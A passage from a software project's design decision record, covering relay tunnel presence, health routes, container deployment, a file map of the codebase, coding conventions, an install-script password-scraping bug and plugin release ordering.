fd plus TLS keys, h2 stream tables, flow-control windows and ws framing state,
all in one process's heap. `child.send(socket)` passes the fd and none of the
rest, so the peer would see a corrupted stream. There is no serialization, no
handoff and no zero-downtime relay restart — a relay restart always costs a
redial, and that is a constraint rather than a thing left unbuilt.

What another process actually needs is not the socket but the fact of it:
`relayOnline` on `POST /v1/tokens` and `GET /v1/admin/relay` used to read the
in-memory `TunnelRegistry`, which the API no longer shares a process with.
`dbRelayView` is a second implementation of the `RelayView` interface `app.ts`
already took — so `app.ts` did not change for any of this, which is that
interface's own comment being cashed in.

**Read with a window, and the asymmetry is the design.** A relay killed hard
cannot delete its rows, so a reader has to decide how long to believe one. A
stale `true` costs one probe and a `503 no_tunnel`, which `meansMachineGone`
already turns into `forgetRoute()` — self-correcting in one round trip. A stale
`false` draws a reachable machine as offline and the client never probes it,
because `machine.ts` answers `no_route` without asking. So: flush every 5s,
believe for 20s, and `relay_id` is a deployment *slot* rather than a process, so
a dead relay's rows are cleared by its replacement at boot.

**Everything is best-effort.** Two writers now share this database with a 250ms
busy timeout, and a presence write must never reach a tunnel's lifecycle. The
flush is what makes that acceptable rather than merely quiet: it stamps
everything live with one timestamp and sweeps this relay's rows older than it, so
a lost `up` repairs within a tick and a lost `down` costs a tick rather than a
staleness window — no `IN (...)` list and no second pass.

**The seam this leaves.** More than one relay needs a second column carrying that
relay's own address and a machine-to-peer forward for a request arriving at the
wrong one. Not built; and until it is, `machine_id` being the primary key means
two relays would fight over a row.

**Status.** Current

### Q4.36 — Why does the relay have `/__relay/health` rather than `/health`?

**Decision.** The relay answers `GET /__relay/health` unauthenticated, before the
proxy, and leaves `/health` to be proxied like everything else.

**Why.** `/health` through the relay belongs to the *daemon* on the far side of a
tunnel: `machine.ts` fetches exactly that, with a token, to settle a machine's
route. A relay that answered it would report every machine in the fleet as
reachable — including ones holding no tunnel at all — and the deploy probe would
go green against a relay carrying nothing. The path is under the prefix the relay
already reserves for `TUNNEL_PATH`, so it takes nothing that was not already the
relay's.

**Why the constant is not in `src/relay/protocol.ts`.** No daemon ever sends this
path, so it is not shared vocabulary — and a change under `src/` puts the
*daemon* on `deploy.sh`'s restart list, which would mean turning every live
session in the fleet `interrupted` to ship a health route.

The pair is asserted together in `relaycheck`, against the shipped listener
rather than a fixture copy of it, because either half alone means nothing.

**Status.** Current

### Q4.37 — Why is there no `depends_on` between the two containers?

**Decision.** None. Either may start first.

**Why.** The relay must serve while the API is down, and that is the property the
split was worth having for beyond deploy cost: authorization is four live row
reads against a file both mount, so a control plane that is stopped prevents you
*minting* a token and does not prevent an existing one reaching your machine.
Wiring a dependency would trade that for an ordering nothing needs.

The one ordering question it raises is answered by doing nothing: on a first boot
the relay may apply `schema.sql` before the API mints a signing key, and a relay
holding no keys answers 401 — to requests that, on a fresh install with no
enrolled daemons, nobody is making. `ensureSigningKey` stays the API's alone,
because a second minter would be a race over the one secret in this system;
`imagecheck` asserts the relay prints no signing key of its own.

**Status.** Current

### Q4.38 — What happens on a host installed before the relay existed?

**Decision.** `svc_installed relay` answers about the *control plane's* container,
not the relay's, and `deploy.sh` creates a relay container when there is none even
though nothing it is made of moved.

**Why.** Without it the split would take the fleet down on the very deploy that
introduced it. `TARGETS` is built from `svc_installed`, so a relay asked about its
own container answers "not installed" on every host that predates the split — it
would never become a target, the deploy would recreate the control plane with
`REEMOAT_CP_RELAY_MODE=external`, and nothing anywhere would be holding a tunnel.
The log would not mention a relay at all.

"Installed" is a question about the deployment, and the relay is not one of its
own: it shares the image, the env file, the database and the compose project. Its
container not existing yet is a thing to fix rather than a reason to skip it —
which is what `svc_container_missing` is, and it answers "present" on anything it
cannot determine, because an engine that will not talk is not evidence and the
cost of guessing "missing" is a recreate of the one service this work exists to
leave alone.

**Status.** Current

### Q4.26 — How is the code laid out, and which way do dependencies point?

**Decision.** Dependencies point one way: `server` → `registry` → `session` →
`acp/*`, with `events.ts` as the shared vocabulary underneath everything.
Nothing in `src/` may ever import from `packages/control-plane`; the one shared
module crossing that line does so in the permitted direction —
`src/relay/protocol.ts` is imported *by* the control plane.

**Why.** The daemon must remain buildable and runnable with no knowledge of the
control plane at all, which is what makes a control-plane outage unable to stop
a session, a token verifying, or a daemon starting. A single import in the wrong
direction would turn a layering rule into a runtime dependency.

**Status.** Current

#### File map

| File | Holds |
|---|---|
| `src/events.ts` | The `SessionEvent` union (the wire vocabulary), `SessionWorkspace`, `StoredEvent`, `EventStore`, `SessionStore`, `MemoryEventStore`, `SessionLog`, size accounting |
| `src/store/schema.sql` | Tables for sessions, events, agent credentials and the single-row daemon lock. v4: the agent handle is four columns, not one. v5: `title` and `pinned`, the only columns here meant to change after creation. v6: `forge_accounts` dropped, `agent_credentials` rekeyed, `owner_subject` left in place and dead |
| `src/store/sqlite.ts` | `openStores`, `SqliteEventStore`, `SqliteSessionStore`, `SqliteAgentCredentialStore` — durability behind the same synchronous interfaces |
| `src/agentauth.ts` | Interactive agent logins: one run per agent, a capped transcript, pty output sanitised into something a `<pre>` can show |
| `src/git.ts` | The git vocabulary and its implementation: argv arrays, an env allowlist that is about determinism rather than confinement, timeouts, honest truncation. Deliberately installs **no** config: your hooks and your LFS filters run. `GitExec` lost `toHost`/`toAgent` with the namespace they translated between |
| `src/worktree.ts` | Per-session worktrees: probe, create, list, inspect, remove |
| `src/uploads.ts` | Files staged for a prompt: the root, the streaming write, the sanitizer, the TTL sweep, and the content blocks they become. Declares `UploadRow`/`UploadIndex`, which `store/sqlite.ts` implements — the same direction `events.ts` declares `EventStore` |
| `src/changes.ts` | What a session changed, and the diff for one file of it |
| `src/acp/agents.ts` | How each agent is launched, how each logs itself in, and how to ask whether it already has. Strips the parent's session env — and everything `REEMOAT_*` — so a daemon started from inside an agent leaks neither its identity nor its credential into children. The only place PATH is walked |
| `src/acp/subagents.ts` | Which tool call a tool call ran inside. The one place claude's `_meta.claudeCode` shape is known, projected to two scalars and never passed through |
| `packages/web/src/ui/tail.ts` | The transcript's shape as pure functions: coalescing, the five-events merge, which card a step belongs to, which events it refuses to draw at all, where a `/clear` cuts it, what a permission was actually answered with, and `sameNode` — whether a rebuilt row would draw the same thing, which is what stops an appended message re-rendering everything above it. All so `webcheck` can assert them with no DOM |
| `src/acp/client.ts` | JSON-RPC over an agent's stdio, routed by `sessionId`. Takes an `AgentProcess` rather than spawning: three pipes and a way to signal what is on the other end. That is what lets a driver stand a pair of `PassThrough`s in for an agent |
| `src/session.ts` | One ACP session: spawn, prompt, normalized events, clean shutdown |
| `src/registry.ts` | Session lifecycle, derived status, the permission state machine, the turn pump |
| `src/token.ts` | The token wire format: compact JWS over Ed25519, encode and decode. Answers only "did the holder of this key produce these bytes" — no policy |
| `src/auth.ts` | `Principal`, `TokenVerifier`, the three implementations, `AUTH_LEEWAY_MS`. Decides what a verified token entitles anyone to |
| `src/enroll.ts` | The single control-plane call this daemon ever makes |
| `src/relay/protocol.ts` | The tunnel's shared vocabulary: version, handshake headers, close codes, bounds. Imported by the control plane too — the one-way rule still holds |
| `src/relay/tunnel.ts` | The daemon's end: dial out, run an h2 *server* on the socket it dialled, splice each CONNECT to loopback, reconnect with full jitter |
| `src/server.ts` | Hono app, auth, routes, and the WS stream connection |
| `src/browse.ts` | Directory listing so a remote client can pick a `cwd`. `REEMOAT_ROOTS` narrows what is *listed* and nothing else — `resolveCwd` is deliberately unconfined. The stall machinery it needs lives in `stall.ts`, because `server.ts` and `worktree.ts` need it too |
| `src/stall.ts` | Asking the filesystem something that may never be answered: the bounded probe, the permit gate, and the memory of which paths do not reply. Shared, because the rule is not about browsing — a `plain` session's `workspace.root` is the caller's own `cwd`, so `server.ts` and `worktree.ts` need it too |
| `src/mounts.ts` | The kernel's mount table, and which filesystems answer over a network. Read from `/proc/self/mounts` or `mount(8)` — never `statfs`, which asks the server the question it is hanging on. Advisory throughout: an unreadable table degrades to the per-path behaviour |
| `packages/web/src/keys.ts` | Enter-to-send, the command menu's keys, and the bare-letter shortcut guards, as pure functions so `webcheck` can assert them with no DOM. Enter is claimed by two of them, and `composerKey` is where that collision is resolved — here rather than in a JSX prop, because the resolution is the part worth asserting |
| `packages/web/src/ui/AppShell.tsx` | The adaptive layout. Rail beside content at `lg`, single column below, decided in CSS |
| `packages/web/src/ui/Markdown.tsx` | Agent output rendered as markdown; code blocks with a lazily-loaded highlighter |
| `packages/web/src/ui/Composer.tsx` | Where a prompt is written: Enter to send, auto-grow, optimistic echo, per-session draft, and the `/` menu. Takes the caret when the session changes under it — except on a coarse pointer, and except after `j`/`k` |
| `packages/web/src/ui/composing.ts` | What the empty composer says and who gets the caret, as pure functions. Holds the two captions that were deleted for moving the box somebody was typing in, the `j`/`k` one-shot flag that stops autofocus eating the next keystroke, and `focusWorthKeeping` — which focus is worth *not* taking, the clause whose first version made the whole feature dead on Chromium |
| `packages/web/src/ui/commands.ts` | What a `/` in the composer means, as pure functions: where the token starts and ends, which entries exist and which of the two sources each came from, and how a query ranks them |
| `packages/web/src/ui/CommandMenu.tsx` | The menu itself: the agent's own commands and the controls it does *not* publish as commands, in one list, in two stages. Never takes focus — the caret stays in the textarea, so rows are not tab stops and the highlight is an index that has to be scrolled into view by hand |
| `packages/web/src/ui/AgentConfigBar.tsx` | The composer's control strip: mode left, model/effort/context right, everything else behind `…`. Drawn from ACP's `category`, never from an id. One height and one radius for everything in it, the paperclip included; the context readout is a ring you press for the numbers, and it holds its slot whether or not there is anything to report |
| `packages/web/src/ui/agentConfig.ts` | Its rules as pure functions — slotting, labelling (`labelFor` for two agents' words for one *control*, `choiceOverride` for two agents' words for one *choice*, plus the two values named `Default` that no agent explains), the context readout (the percentage, what the popover says in words, and the thresholds the ring changes colour at), and the prose the snapshot strips — so `webcheck` can assert them with no DOM |
| `packages/web/src/ui/Bubble.tsx` | The user's own messages, right-aligned and hugging their content. One component, three call sites, so they cannot diverge again |
| `packages/web/src/ui/settings/` | Settings as a list and a detail, since it stopped being one flat scroll: `SettingsNav` (the rail at `lg`, the whole screen below it, and the blocked count it owes the list it replaces), and one file per section — `AgentsSection`/`AgentsPanel` is what `ui/Settings.tsx` became, a wizard that drives an agent's own login under a pty plus a paste box for a token minted elsewhere; then Machines, Account and Users |
| `packages/web/src/ui/SessionBrowser.tsx` | The fleet: a Pinned group above one collapsible section per machine, at two densities. A pinned row is in both — pinning is a second way to reach a session, not a relocation. Blocked rows say so on their own status dot and are counted on their machine's header — where the count replaces the live count rather than mounting beside it — so a closed section cannot hide one. No search box, and the comment where it was says why one must not come back as component state |
| `packages/web/src/ui/SessionMenu.tsx` | What you can do to a session — rename, pin, stop, resume — as one menu, used from both the session header and every list row, plus the `RenameField` they share |
| `packages/web/src/ui/groups.ts` | Which sections are collapsed, `visibleRows` — the **single** source of render order, shared with `keyboard.ts` so `j` cannot land on a row nobody can see, and deduplicated by key because a pinned session is drawn twice and must be stepped through once — and `machineSubline`, the one trailing slot on a machine header and the precedence that decides a waiting session cannot be hidden behind a live count |
| `src/paths.ts` | `containedIn` / `atOrUnder`: realpath first, then compare segment-wise. The one containment primitive, shared by the worktree remover and the browse roots |
| `src/runtime/types.ts` | `SessionRuntime`, `AgentProcess`, `Liveness`. Where an agent runs, as an interface — kept with one implementation because it is the seam a confining runtime would fill, and because the drivers substitute their own |
| `src/runtime/local.ts` | The only runtime: the agent as a child of this daemon. Also `hostLoginArgs`, which allocates the pty a login needs, and the probe that answers whether an agent is signed in |
| `deploy/lib.sh` | The **only** place that knows one machine from another: `service_backend` (a unit or a container, and it decides before the init system does), where `node`, `git`, `pnpm` and `docker` actually are, what a unit is called and where it lives, how one is rendered and reloaded, and — in `service_origin` — the one rule for what address a service answers on, read out of its own env file and shared by the health probe and `cpctl.env` |
| `deploy/install.sh` | One-time setup for **one** service. A wizard on a terminal — settings, the unit *or the image*, the start, the one-time admin key, and the enrollment that used to be a checklist; a plain installer without one |
| `deploy/deploy.sh` | The update path, for a person today and a runner later. Refuses a dirty tree, then restarts only what the diff actually touched |
| `deploy/run-daemon.sh` | What the supervisor runs, for the one service that still has a supervisor. Standalone by design — it must work when the environment is at its strangest, so it depends on nothing here |
| `deploy/run-cp.sh` | On no code path any more, and **kept until the last host has migrated**: a rendered unit's `@EXEC@` points at this file, so deleting it takes the fleet down at the next reboot rather than at the next deploy. Measured: `EX_CONFIG` and a ten-second crash loop |
| `deploy/compose.sh` | The same idea for the control plane: `docker compose` with the project name, project directory, env file and image tag already pinned. A passthrough, so any compose command reaches the same stack. **Not** the repository root as the project directory — compose would load the daemon's `.env` from there |
| `deploy/docker/Dockerfile`, `compose.yml`, `prune-store.mjs` | The control plane as an image: a filtered install, the web bundle built in, and a reachability walk that removes what the root workspace package dragged in |
| `deploy/launchd/reemoat.plist.in`, `deploy/systemd/reemoat.service.in` | One template per init system, for the one service that still has a unit. Two files differing in three words is how two files stop differing in only three words |
| `scripts/daemon.ts` | Entry point: env, signals, logging |
| `scripts/client.ts` | Terminal client. Was the only UI; now the reference implementation of the token and replay logic `packages/web` mirrors |
| `scripts/harness.ts` | Pre-daemon CLI that drives `Session` directly. Keep it working: it is the regression test for the untouched default paths |
| `scripts/authcheck.ts` | Offline regression driver for `token.ts`/`auth.ts`/`enroll.ts`. Same role as `harness.ts`, for the auth paths |
| `scripts/daemoncheck.ts` | Same, for the daemon's HTTP surface and its durable state: every route against an unknown id, the schema v6 migration, `hostLoginArgs` on both platforms, the login run registry, the WS over a real socket, subagent lineage, the permission state machine against an agent that really is waiting, the transcript on disk, what a session changed against a real repository, and the one bound on a request body |
| `scripts/relaycheck.ts` | Offline regression driver for the relay: framing, flow control, authorization ordering, the CORS preflight, a WebSocket through the tunnel |
| `scripts/pincheck.ts` | Same, for the ACP adapter's version: exact in `package.json`, agreed with `pnpm-workspace.yaml`, and — the only assertion here that reads disk rather than text — matching what is *actually installed* |
| `scripts/deploycheck.ts` | Same, for `deploy/` — the only driver whose subject is shell. Sources `lib.sh` under `sh -c` from the one directory it resolves from, against a `mkdtempSync` `HOME`. What it drives is **enumerated in its own header** rather than described, because "everything derivable" was already false when it was written: `sq`'s round trip, `set_env`'s two arms and its two refusals, `file_value`'s guard in the assignment form callers use, `runtime_path`'s ordering *and* its group-writable warning, `service_origin` on a wildcard bind and a kernel-assigned port, `resolve_bin`, `INIT_SYSTEM=none`, and a unit rendered for **both** init systems from whichever this is |
| `packages/web/scripts/webcheck.ts` | Offline regression driver for the browser client: the rotation cursor, replay, the close-code table, the permission context. Stubs `window`, uses a real loopback socket |
| `packages/control-plane/src/app.ts` | Routes: tokens, machines, grants, enrollment, admin |
| `packages/control-plane/src/main.ts` | Its entry point: env, the two listeners, the relay wiring, and where the built web client is served from |
| `packages/control-plane/src/relay/authorize.ts` | May this caller reach this machine at all. Verify, then read `aud`, then check live user/machine/grant rows |
| `packages/control-plane/src/relay/registry.ts` | Which machines hold a tunnel, and how to open a stream down one |
| `packages/control-plane/src/relay/tunnel-endpoint.ts` | Where daemons dial in. Authenticates *before* the WS handshake completes |
| `packages/control-plane/src/relay/proxy.ts` | The browser-facing half: authorize, then let Node's own HTTP client serialize onto a CONNECT stream |
| `packages/control-plane/src/keys.ts` | Signing keys, key ids, and the opaque credentials (API keys, enrollment codes) |
| `packages/control-plane/src/store.ts` | Its own SQLite, same 0700/0600 discipline — this one holds the private key |
| `packages/control-plane/scripts/cpctl.ts` | Terminal client for the control plane |
| `src/cors.ts` | The one CORS vocabulary, shared with the relay. Why the origin is `*` |
| `packages/web/src/elicitation.ts` | A question the agent asked, as controls somebody can fill in: the field union, the draft rules, and `elicitationAnswer` — which returns the request body and the `canSubmit` that enables it in one pass, so the two cannot disagree. Reads no field name, ever |
| `packages/web/src/ask.ts` | What the ask card holds and nobody else needs: a half-filled form, which question is on screen, and whether the card is folded away — all keyed by the *request* and not the session, because two can be parked at once. Collapse is keyed by an ask id of **either** kind, which is why this is not called `elicitationDraft.ts` any more. At `src/` for the reason `attach.ts` is |
| `packages/web/src/ui/AskCard.tsx` | The one card for "the agent is waiting on you", whichever way it asked. Where it sits, that it moves nothing behind it, the collapse, the ✕, the numbered answer rows and their hover, the digit shortcuts. Two bodies go inside it and neither knows what the other is |
| `packages/web/src/ui/ElicitationCard.tsx` | The question's body: fetch the form, step through it, turn a draft into an answer. Renders generically, which is what makes it right for an MCP server's schema as well as for `AskUserQuestion` |
| `packages/web/src/attach.ts` | Files attached to a message not yet sent: a module `Map` with its own subscribers, `admitFiles`, `sendableAttachments`. At `src/` rather than `src/ui/` because `store.ts` imports it |
| `packages/web/src/paths.ts` | `relativeTo` and `filenameFor`: the join between the absolute paths the daemon speaks and the workspace-relative path the download route takes |
| `packages/web/src/ui/download.ts` | `saveBlob`, and the one line in it that must never change — see the invariant |
| `packages/web/src/ids.ts` | Branded `MachineId`/`SessionId`/`SessionKey`, and the three rules that make `(machineId, sessionId)` structural |
| `packages/web/src/wire.ts` | The daemon's vocabulary, hand-mirrored, and why it could not be imported |
| `packages/web/src/machine.ts` | One machine: its token and its reachability, both through the relay. `forgetRoute` drops the belief that it is up, never on an HTTP status |
| `packages/web/src/stream.ts` | One session's socket: rotation before expiry, the close-code table, the cursor |
| `packages/web/src/store.ts` | All client state, and `resume()` — the single wake path |
| `packages/web/src/resume.ts` | Noticing the phone woke. Four triggers, one debounced call |
| `packages/web/src/permission.ts` | What is actually being approved, from the request and from the log |
| `packages/web/src/http.ts` | `ApiError` and the one error envelope every service in this system answers with |
| `packages/web/src/cp.ts` | The only place the browser's credential is sent, and only ever to this origin |
| `packages/web/src/daemon.ts` | The daemon's HTTP surface, mirrored: sessions, prompts, permission answers |

### Q4.27 — What import and type conventions does the codebase follow?

**Decision.** Relative imports end in `.js`; builtins use the `node:` prefix;
type-only imports use `import type`.

**Why.** `verbatimModuleSyntax` is on, so the type-only form is required rather
than stylistic — the compiler emits imports exactly as written.

**Status.** Current

### Q4.28 — How are stateful classes constructed and torn down, and how is input validated?

**Decision.** Stateful classes use a private constructor plus a static async
factory (`Session.start`, `AcpClient.launch`); teardown is returned as an
unsubscribe function; idempotent shutdown is written `this.x ??= this.doX()`.
Validation is hand-written — no zod.

**Why.** A private constructor plus an async factory is the only shape that lets
construction await something, so no object exists in a half-started state. The
memoised-promise form of shutdown makes a second call join the first rather than
starting a second teardown.

**Status.** Current

### Q4.29 — May anything in `src/` write to stdout or stderr?

**Decision.** No. Everything reports through an injected callback
(`onDegraded`, `onWarning`), and only `scripts/` print. There are exactly two
sanctioned exceptions, and both are places where no callback exists to report
through:

1. `store/sqlite.ts`'s v6 migration prints when it destroys something — a
   dropped forge account, a collapsed credential, sessions cut by a cap that
   used to be per-person.
2. `src/plugins/runner.ts`'s `unhandledRejection` handler writes to the child's
   own stderr.

**Why.** Those migration prints happen inside `openStores`, before any callback
the daemon could have wired, so they are the only moment anybody can be told
that data was destroyed.

The second is a different argument for the same reason. `runner.ts` runs in the
**child** process, not the daemon: it has no `onWarning` to reach, because the
callback lives on the other side of an IPC channel a floated rejection may have
nothing to do with. What it writes goes to the stderr `runtime.ts` already
captures into a ring of `PLUGIN_LOG_LINES`, which is what a failed plugin's row
shows — so the write *is* the report, arriving by the only route there is.
Deliberately not fatal: a floated promise in one hook must not take a plugin's
screens down with it.

**Status.** Current — amended when the plugin subsystem landed. The count is
stated here rather than only in `CLAUDE.md` because a rule with a number in it
is a rule that goes stale silently, and this is the sentence people quote.

### Q4.30 — What is a comment required to say?

**Decision.** An empty `catch` always carries a comment saying why. Comments
explain *why*, often naming the empirical behaviour that motivated the code.

**Why.** A swallowed error with no stated reason is indistinguishable from a
forgotten one, and a rule justified by a measurement outlives the person who
took it only if the measurement is written beside the code.

**Status.** Current

### Q4.31 — What does a marker line printed once and scraped by a shell have to promise?

**Rule.** **`admin password: ` must never appear on a line that does not carry the
password.** `main.ts`'s other arm prints `admin password source: …` — a different
*prefix*, not a different suffix — and `install.sh` anchors both of its scrapes on
`[^ ]+$`.

**Why the old argument was the wrong one.** The comment above that line said the
two markers cannot pick up each other's value because `admin password: ` and `API
key: ` share no substring. True, and beside the point: what collided was a marker
with **its own second wording**. `install.sh` runs `awk '/^ *admin password:
/{ print $NF }'`, and the second arm printed `admin password: taken from
…_PASSWORD (not printed)`. It matched, took the last field, and told the operator
their fleet admin password was the literal string **`printed)`**.

**Why nothing caught it.** That arm is option 2 of this script's own interview —
`REEMOAT_CP_BOOTSTRAP_ADMIN_PASSWORD` already set — and `imagecheck` drives only
the generated arm, asserting that the password is printed exactly once and that
the line does not contain `API key: `. Both assertions passed on a line carrying
no password at all.

**Why the prefix and not just the anchor.** The two fixes are belt and brace and
the prefix is the belt: a scrape anchored on the *old* marker cannot match the new
line however it is worded, so an installer from before this change reads nothing
rather than reading something wrong. The anchor holds because a real value is one
field with no spaces — `generatePassword` is `randomBytes(24).toString("base64url")`
and an API key is `rk_` plus the same alphabet — so a marker line carrying a
sentence now matches nothing and the scrape comes back empty, which is a case the
report handles out loud where a confidently wrong value is not. The same
tightening went on the `API key: ` scrape beside it, because a rule that holds for
one of two adjacent values is a rule somebody deletes.

**A second defect in the same loop.** The break was `[ -z "$_key" ] || break`, on
the key alone. `main.ts` prints the key line *first*, so a read landing between
the two `console.log` calls exited holding a key and an empty `$_pw` — and the
window is not the microsecond between the calls but however long the container's
log transport takes to make the second line readable. The password is written
**nowhere** else (not `cpctl.env`, not the env file) and the report is gated on
`[ -n "$_pw" ]`, so the fleet's admin password was lost with no message printed at
all. The loop now waits for the key **and** either the password or the
`admin password source: ` marker — the latter is not a hedge: with the variable
set there is nothing to wait for, and requiring `$_pw` would spend the full minute
waiting for a line that is never coming.

**How it is pinned now.** `deploycheck` extracts the shipped `awk` lines out of
`install.sh` and renders `main.ts`'s own `console.log` bodies with their
interpolations filled in, so neither file's strings are copied into the driver —
the scrape and the thing it scrapes are one contract in two files, and the driver
is the one place they meet. The regression itself is a deliberate literal, since
the string is gone from `main.ts` and there is nothing left to extract; measured
out of band that the fixture discriminates, old pattern → `printed)`, new pattern
→ empty. One finding came out of writing it: the injected line has to go **last**,
because both scrapes end in `tail -1` — a hostile marker placed *above* the real
credentials is green against the unanchored pattern too and proves nothing.

**Status.** Current

### Q4.32 — Does the rendered unit honour `REEMOAT_ENV_FILE`?

**Rule.** It does now. `@ENV_FILE@` is a placeholder in both unit templates and one
substitution line in `render_unit`, through the same `subst_value`/`esc_sed`/`esc_xml`
chain as every other value; the systemd form is quoted, because that path lives under
`$HOME` and may hold a space.

**Why.** Q4.9 says env paths are overridable, and that was true of everything except
the supervised process. Neither `launchctl bootstrap` nor `systemctl --user` carries
the installing shell's environment into the job, so `run-daemon.sh` always fell back
to `$HOME/.reemoat/daemon.env` however `install.sh` had been invoked. Two outcomes,
and the second is the worse: an exit-2 restart loop when no default file exists, and
a **silent success** against a stale one — both services default to port 7887, so
`wait_healthy` probes the address in the env file it can see and reports green for a
daemon running the wrong configuration.

**Consequence, and it is the cut `REEMOAT_UNIT_PATH` already makes.** The path is
baked in at render time, so a host installed with the override needs the variable in
`deploy.sh`'s environment too, or a template change re-renders the unit onto the
default path. `deploy.sh` already needed it to read the right port for its probe.

**Measured.** `deploycheck` renders both init systems with and without the override:
the plist carries the key and its value is entity-encoded (the sandbox home holds `&`
and `<`), the systemd unit carries it quoted (the sandbox home holds a space), and
with the override set the path arrives and `/.reemoat/daemon.env` appears nowhere.
Written as its own block because the existing "no placeholder survives" check stays
green when the placeholder and the substitution are deleted *together* — verified.
The fixture is `/etc/reemoat/deploycheck-packaged.env` rather than the obvious short
name, because the plist's own comment is rendered into the plist and quotes
`/etc/reemoat/d.env`, which made the launchd half pass against reverted code.

**Not assertable.** That the two supervisors really do drop the invoking shell's
environment. That needs a real supervisor, which `deploycheck`'s own header excludes;
what is asserted is that the unit names the file `install.sh` wrote.

**Status.** Current

### Q4.102 — What should "URL daemons will dial" default to?

**Decision.** The relay address the operator named one prompt earlier — `$_rhost` —
and `lan_address` only when that is a wildcard bind.

**Why.** The old default was `http://${_lan:-$_host}:$_rport`, and `_lan` is assigned
**nowhere in the tree**. So it always fell back to `$_host`, the *API* publish
address, while the operator had explicitly answered a different question about the
relay. The scenario is the ordinary one Q4.6 exists for: API on `127.0.0.1`, relay on
a public interface, one Enter — and every daemon then receives a loopback relay URL
through `/v1/enroll` and is stranded behind a single-use enrollment code. A wildcard
(`0.0.0.0`, `*`, `::`) is not an address anybody can dial, which is the one case
where guessing an interface is better than echoing the answer.

**Consequence.** On a host where the relay was deliberately bound to a wildcard *and*
`lan_address` picks the wrong interface — a ZeroTier/Tailscale fleet, which the
picker's own comment says is the case here — the offered default is the default-route
address. It is still a default over a prompt, and that branch was already a guess.

**Measured.** `deploycheck` extracts the shipped `case` block and the shipped `ask`
line and runs them with `lan_address` stubbed and stdin at EOF, so `ask` returns its
default: relay `203.0.113.7` + API `127.0.0.1` gives `http://203.0.113.7:7889` where
the old expression gave `http://127.0.0.1:7889`; the mirror (relay on loopback, API
on `0.0.0.0`) gives loopback, so the fix is not "always guess an interface"; all
three wildcard arms reach the stub; and a structural filter asserts no non-comment
line in `install.sh` reads `$_lan` again.

**Status.** Current

### Q4.100 — Does `deploy/compose.sh up -d` do what a deploy does?

**Decision.** No. A bare `up -d` is the whole compose project and recreates the
control plane **and** the relay; `deploy.sh` is what keeps them apart. Every
`svc_*` verb names its compose service through `compose_service`, and
`deploy/compose.sh up -d --no-deps relay` is what a relay deploy actually is.

**Why.** The split exists so that a `packages/web` or `app.ts` change does not
drop every tunnel in the fleet (Q4.33), and a verb that hands compose the project
rather than a service undoes exactly that while still printing a successful
deploy — it would have made the split buy nothing while looking complete. Naming
the service in one function rather than at each call site is what stops the next
verb reintroducing it. Recreating both is a legitimate operator act; it is just
not what a deploy does, which is why the warning is on the command and not in the
script.

**Status.** Current

### Q4.101 — Does the relay add a third arm to `install.sh`?

**Decision.** No. `install.sh` still takes **one** service per run, and
`control-plane` brings the relay up beside it while asking no new questions.

**Why.** Two deployments is the design — one per fleet holding the signing key,
one per host running agents on it — and the relay is not a third of those: it
shares the control plane's image, env file, database and compose project, and
differs only in that it does not share a restart (Q4.33). Every value it reads
was already answered by the control plane's own interview, so a third arm would
present a configuration decision that does not exist and a fourth question with
no answer of its own.

**Status.** Current


### Q4.103 — Why does a plugin ship as one artifact?

**Decision.** One archive holds the manifest, the server half and — by way of the
descriptions that server half returns — the screens. There is no separate client
package and no version negotiation between the two halves.

**Why.** Three things ship on three schedules here and nothing coordinates them:
the control plane weekly from a tag, the web client **inside that image**, and a
daemon whenever its owner runs `deploy.sh`. That is what
`.claude/rules/compatibility.md` calls the fact that decides everything else, and
a plugin split across two of those schedules would inherit the whole problem —
plus a third schedule of its own.

A plugin whose halves arrive together cannot see the skew at all: whatever
`server.js` returns is drawn by whatever client is loaded, through a vocabulary
whose version is negotiated once, at install, as a **range**
(`PLUGIN_API_VERSION` / `PLUGIN_API_MIN_VERSION`). That is rule 1 applied
honestly — negotiated, never a label — and it is why nothing in this subsystem
reads `DAEMON_VERSION`.

**What that forced.** The UI had to be declarative, since a bundle is a second
artifact by definition. Q1.613 is the security half of that same decision; this is
the packaging half, and either one alone would have led here.

**Status.** Current

### Q4.104 — Why does the control plane host no plugins?

**Decision.** Plugins are installed on a daemon, per machine. The control plane
holds none, runs none, and has no route for them.

**Why.** It has nothing a plugin wants. There are no sessions there, no
transcripts, no worktrees and no files — it issues identity and relays bytes it is
written never to parse. An integration that reacts to what an agent did cannot be
built from anything the control plane can see.

And it ships differently: that image is rebuilt by a release, so "installing"
something into it would be a deploy rather than an install, performed by whoever
owns the box rather than by the person who wants the plugin.

**What is genuinely lost.** An admin cannot install something for everybody at
once. That is the same shape as fleet rollout (Q7.42) and is refused for the same
reason — a daemon is updated by its owner, and nothing here is a step toward
changing that. What a future distribution mechanism could do without touching any
of this is carry the *archive*, with the browser as the courier and the install
still an act on the machine; that costs no daemon change and is recorded as
Q7.106.

**Status.** Current


### Q4.105 — Which side of the fleet ships first?

**Rule.** Whoever has to be able to **answer** ships first. Whoever will **ask**
ships second.

**Why it needed saying.** The procedure for a breaking change was already written
down — *accept-both first, send-new second* — but only for the relay protocol,
where the answering side happens to be the control plane. Read as a fact about
*the control plane* rather than about *the answering side*, it generalises exactly
backwards, and the first advice given about deploying plugins was that backwards
generalisation: control plane first, then daemons.

For a new route on the daemon the direction is reversed. The web client calls
`GET /plugins`; the daemon answers it. So a control plane deployed first — and it
carries the web client — hands every user a Plugins screen that says *"update your
machine"* until each owner gets round to it, which for a fleet whose daemons are
updated by hand is measured in weeks.

**The mistake underneath it, because it is the part worth not repeating.**
`compatibility.md` states that *new client against old daemon is the normal state
of the fleet*. That is a claim about what this system **tolerates** — the client
degrades by design, `fetchPlugins` treats an old daemon and a machine with nothing
installed as the same thing, and `pluginFailure` says the honest sentence. It is
not a claim about what to **choose**. Tolerating a skew and electing to create one
are different acts, and collapsing them is how the tolerance gets spent for
nothing.

**What the right order buys, beyond avoiding the window.** With daemons first, a
plugin can be installed before any screen exists — `pnpm client plugin install`
needs no UI — so its hooks are already writing by the time the control plane
ships, and the first board anybody opens is populated rather than empty with an
invitation.

**Where the two rules meet, the protocol wins.** In a release carrying both a new
protocol version and a new daemon route, control-plane-first is forced, and not as
a tie broken by taste: a relay that cannot accept what a daemon offers is a daemon
that cannot dial in **at all**, while a route that is not there yet is a screen
with a sentence on it. The hard requirement takes the order and the soft degrade
is the price.

**What made this release unambiguous.** Nothing forced the other way:
`RELAY_PROTOCOL_VERSION` stayed `1`, `CP_SCHEMA_VERSION` stayed `1`, and the
control plane's image never reaches `src/plugins` — checked rather than assumed,
by walking the import closure of the five files `deploy/docker/Dockerfile` copies.
Its deploy here is the web client and nothing else.

**Status.** Current

